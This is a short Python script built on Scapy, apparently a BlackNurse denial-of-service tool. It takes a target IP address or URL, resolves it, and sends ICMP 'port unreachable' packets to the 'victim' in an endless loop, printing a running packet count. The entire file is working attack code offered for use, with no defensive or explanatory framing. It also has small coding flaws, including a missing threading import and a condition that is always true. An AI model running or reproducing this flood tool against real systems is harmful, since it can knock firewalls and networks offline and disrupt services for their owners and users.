#!/usr/bin/env python
#author Aiden

from scapy.all import *
import sys , re , socket 

if len(sys.argv) != 2:
	print "Usage: blacknuser.py <target>"
	sys.exit(1)

sys.tracebacklimit=0	
victim = sys.argv[1]
#iface = 'eth0'
#socket = conf.L2socket(iface=iface)

class blacknurse(threading.Thread):
	try:
		def check(self):
			global target,victim
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)

		def run(self):
			self.check()
			packet = IP(dst=target)/ICMP(type=3,code=3)
			send(packet)

	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available!'
		sys.exit(1)
total = 0	
black = blacknurse()
while True:
	black.run()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
